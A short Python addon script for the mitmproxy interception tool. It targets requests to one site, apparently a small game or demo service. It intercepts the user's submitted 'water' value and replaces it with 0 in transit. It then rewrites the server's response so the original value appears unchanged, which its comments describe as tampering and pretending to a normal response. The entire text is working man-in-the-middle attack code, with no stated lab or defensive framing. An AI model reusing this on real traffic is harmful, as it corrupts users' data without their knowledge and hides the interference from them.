import json

water_amount = 0
def request(flow):
    global water_amount

    # If you use transparent mode, you might want to use pretty_url.
    if flow.request.pretty_url == 'http://www.watarunrun.com:5000/result':

        # get water_amount before replace.
        water_amount_json = json.loads(flow.request.content)
        water_amount = water_amount_json['water']

        # replace the water amount for tampering.
        flow.request.replace('"water": [0-9]+', '"water": 0')

def response(flow):
    global water_amount

    # pretend to normal response.
    flow.response.replace('water: 0', 'water: ' + str(water_amount))